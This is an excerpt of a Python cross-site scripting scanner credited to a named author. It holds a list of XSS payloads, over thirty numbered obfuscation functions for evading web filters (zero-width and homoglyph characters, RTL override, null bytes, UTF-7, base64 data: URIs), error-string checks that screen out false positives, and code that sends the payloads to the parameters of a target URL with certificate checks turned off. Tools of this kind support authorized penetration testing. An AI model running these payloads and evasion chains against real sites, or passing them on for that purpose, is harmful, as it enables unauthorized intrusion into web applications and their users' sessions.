...
# ════════════════════════════════════════════════
#  False-positive controls (tweak in ONE place)
# ════════════════════════════════════════════════
FALSEERRORS = [
    "you have an error in your sql syntax",
    "sqlstate[42000]",                     # MySQL / MariaDB
    "sqlite error",
    "near \"", "syntax error at or near",  # SQLite / PostgreSQL
    "unclosed quotation mark",             # MSSQL
    "org.hibernate",                       # Java / Hibernate
    "warning: pg_",                        # PostgreSQL warnings
    "you have an error in your sql syntax",        # MySQL / MariaDB
    "sqlstate[42000]",                             # MySQL / MariaDB
    "sqlstate[42",                                 # Any SQLSTATE* (generic catch-all)
    "sqlite error",                                # SQLite (generic)
    "near \"",                                     # SQLite
    "syntax error at or near",                     # PostgreSQL
    "warning: pg_",                                # PostgreSQL warnings
    "unclosed quotation mark",                     # MSSQL
    "incorrect syntax near",                       # MSSQL
    "ORA-",                                        # Oracle (ORA-06512, ORA-00933 …)
    "org.hibernate",                               # Java / Hibernate
    "jdbc exception",                              # Java / JDBC

    # ── NoSQL & alt-stores (optional, cheap to keep) ─────────────
    "MongoDB.*exception",                          # MongoDB
    "Cassandra.*exception",                        # Cassandra
    "Neo4jError",                                  # Neo4j / Cypher

    # ── Generic web-/app-stack traces ────────────────────────────
    "Traceback (most recent call last)",           # Python
    "PHP Warning",                                 # PHP
    "System.NullReferenceException",               # .NET
    "Server Error in '/' Application",             # ASP.NET
    "ActionView::Template::Error",                 # Ruby on Rails

    # ── Proxy / 5xx infrastructure noise ─────────────────────────
    "internal server error",                       # HTTP 500 generic
    "502 bad gateway",                             # Nginx / proxies
    "503 service unavailable",                     # Upstream down
    "gateway timeout",                             # 504 / Cloudflare    
]

def looks_like_sql_error(body: str) -> bool:
    """Cheap SQL-error detector – case-insensitive substring search."""
    lower = body.lower()
    return any(e in lower for e in FALSEERRORS)

def truexss(response_text: str, payload: str) -> bool:
    """
    True  → looks like genuine XSS reflection  
    False → payload reflected only inside SQL error / plain text
    """
    if payload not in response_text:
        return False                     # not even reflected
    if looks_like_sql_error(response_text):
        return False                     # very likely SQL-i
    # You can add the tiny HTML–context check here later if you like
    return True
...
xss_payloads = [
    ...
    # MIME sniffing-based payloads (bypasses content-type)
    "<script>/*</script>*/alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<math><mi//xlink:href='javascript:alert(1)'>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",

    # Scriptless XSS using event handlers
    ...
    "<div data-attr='\" onmouseover=alert(1)'>hover</div>",
    "<input autofocus onfocus=alert(1)>",

    # Clobbered JS context tricks
    "<input name=constructor><input name=alert value=1><form onsubmit=alert()>",

    # DOM clobbering (triggers scriptless payloads via reflection)
    "<input id=SRC><input name=onerror value=alert(1)>",
...
obfuscation_methods = [
        ...
        # 95. Inject Zero Width Space (\u200b) between all characters
        lambda payload: ''.join(char + '\u200b' for char in payload) if payload else payload,

        # 96. Insert Line Separator (\u2028) and Paragraph Separator (\u2029)
        lambda payload: payload.replace('<', '\u2028<').replace('>', '>\u2029') if payload else payload,

        # 97. Apply Right-to-Left Override (\u202E)
        lambda payload: '\u202E' + payload[::-1] if payload else payload,

        # 98. Use fullwidth homoglyph characters (ｓｃｒｉｐｔ, ａｌｅｒｔ, etc.)
        lambda payload: ''.join(chr(ord(char) + 0xFEE0) if '!' <= char <= '~' else char for char in payload) if payload else payload,

        # 99. Mix Unicode BiDi isolates (\u2066, \u2067, \u2069)
        lambda payload: '\u2066' + payload + '\u2069' if payload else payload,

        # 100. Replace some key characters with homoglyphs from Cyrillic, Greek, etc.
        lambda payload: payload.replace('a', 'а').replace('e', 'е').replace('o', 'о').replace('i', 'і') if payload else payload,  # Latin → Cyrillic homoglyphs

        # 101. Break `script` tag into entities + nulls
        lambda payload: payload.replace('<script>', '<scr\0ipt>').replace('</script>', '</scr\0ipt>') if payload else payload,

        # 102. Inject invisible character cluster (\u200c\u200d\u2060)
        lambda payload: ''.join(char + '\u200c\u200d\u2060' for char in payload) if payload else payload,

        # 103. Reverse payload + RTL override + zero width
        lambda payload: '\u202E' + ''.join(c + '\u200b' for c in payload[::-1]) if payload else payload,

        # 104. Encode every char as overlong UTF-8 (e.g. \xC0\xAF for '/')
        lambda payload: ''.join(['%C0%'+format(ord(c),'x') if ord(c) < 128 else c for c in payload]) if payload else payload,

        # 105. Use invalid XML/HTML entity mashup: &#0000script&#x0000;
        lambda payload: ''.join(f"&#x{ord(c):04x};" if c.isalnum() else c for c in payload) if payload else payload,

        # 106. Mix JS keywords with comment injection (`a<!-- -->lert`)
        lambda payload: payload.replace('alert', 'a<!-- -->lert').replace('script', 'scr<!-- -->ipt') if payload else payload,

        # 107. Insert `\u0000` (null byte) between each tag char
        lambda payload: ''.join(char + '\u0000' for char in payload) if payload else payload,

        # 108. Replace `=` with malformed encodings (`%3D`, `&equals;`, `\u003D`)
        lambda payload: payload.replace('=', random.choice(['%3D', '&equals;', '\\u003D'])) if payload else payload,

        # 109. Insert dummy HTML attributes (`<script fake="param">`)
        lambda payload: payload.replace('<script>', '<script fake="x">') if payload else payload,

        # 110. Replace quotes with grave accent or backtick (` or \u0060)
        lambda payload: payload.replace('"', '`').replace("'", '\u0060') if payload else payload,

        # 111. Encode only first half of payload in hex (partial hex poisoning)
        lambda payload: ''.join(f"%{ord(c):02X}" if i < len(payload)//2 else c for i, c in enumerate(payload)) if payload else payload,

        # 112. Add random valid but unrelated HTML tags around payload
        lambda payload: f"<bdi><i>{payload}</i></bdi>" if payload else payload,

        # 113. Break `src=javascript:` with comment or space: `src=jav<!-- -->ascript:`
        lambda payload: payload.replace('javascript:', 'jav<!-- -->ascript:') if payload else payload,

        # 114. Use `onerror` as `onerror\u0000=`
        lambda payload: payload.replace('onerror=', 'onerror\u0000=') if payload else payload,

        # 115. Double-tag trick: `<img><script>alert(1)</script>`
        lambda payload: f"<img>{payload}" if payload else payload,

        # 116. Inject non-printable control characters (`\x01-\x1F`)
        lambda payload: ''.join(char + chr(random.randint(1, 31)) for char in payload) if payload else payload,

        # 117. Use "tag in tag": `<img src="<script>alert(1)</script>">`
        lambda payload: f'<img src="{payload}">' if payload else payload,

        # 118. Split tag using grave accents: `<scr` + `ipt>`
        lambda payload: payload.replace('<script>', '<scr`ipt>').replace('</script>', '</scr`ipt>') if payload else payload,

        # 119. Add `srcdoc` injection: `<iframe srcdoc="...">`
        lambda payload: f'<iframe srcdoc="{payload}"></iframe>' if payload else payload,

        # 120. `meta refresh` with obfuscated content injection
        lambda payload: f'<meta http-equiv="refresh" content="0;url=javascript:{payload}">' if payload else payload,

        # 121. UTF-7 Encoding Trick (browser-dependent, IE-based)
        lambda payload: "+ADw-" + payload.replace('<', 'script+AD4-').replace('>', '+ADw-/script+AD4-'),

        # 122. Encode payload inside `data:` URI (e.g., data:text/html)
        lambda payload: f"data:text/html,{payload}" if payload else payload,

        # 123. Encode payload inside base64'd `data:` URI
        lambda payload: f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}" if payload else payload,

        # 124. Mix tag boundaries (RFC-breaking)
        lambda payload: payload.replace('<script>', '</style><script>').replace('</script>', '</script><style>'),

        # 125. JavaScript-based dynamic generation (for DOM XSS)
        lambda payload: f"<script>location.href='?x='+(function(){{return `{payload}`}})()</script>" if payload else payload,

        # 126. Reflect `constructor` based clobbering
        lambda payload: f"<input name=constructor><input name={payload}>" if payload else payload,

        # 127. Use SVG + `desc` tag injection
        lambda payload: f"<svg><desc><![CDATA[{payload}]]></desc></svg>" if payload else payload,

        # 128. Add random tag prefixes/suffixes (to exploit parser quirks)
        lambda payload: f"<p><xmp>{payload}</xmp></p>" if payload else payload,

        # 129. Inject via `<noscript>` bypass
        lambda payload: f"<noscript><p title=\"</noscript><script>{payload}</script>\">" if payload else payload,

        # 130. Break tag boundaries with double-encoded angle brackets
        lambda payload: payload.replace('<', '%3C').replace('>', '%3E') if payload else payload,
...
#        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
        try:
            server_header = requests.head(url, timeout=3, verify=False).headers.get("Server", "generic")
        except:
            server_header = "generic"

        selected_filters = generate_adaptive_payloads(
            xss_payloads[:self.use_filters],
            obfuscation_methods,
            server_header
        )
        for param in filtered_params:
            for payload in selected_filters:
                ...
                try:
                    ...
                    if response.status_code == 200 and truexss(response.text, payload):
...
{MAGENTA}{r"""Programmed by: Haroon Ahmad Awan (haroon@cyberzeus.pk)"""}{END}
    ...
    dest="adaptive",
    action="store_true",
    help="\033[93m                      Enable adaptive payload generation using server-type logic and obfuscation chains.\033[0m"
    )
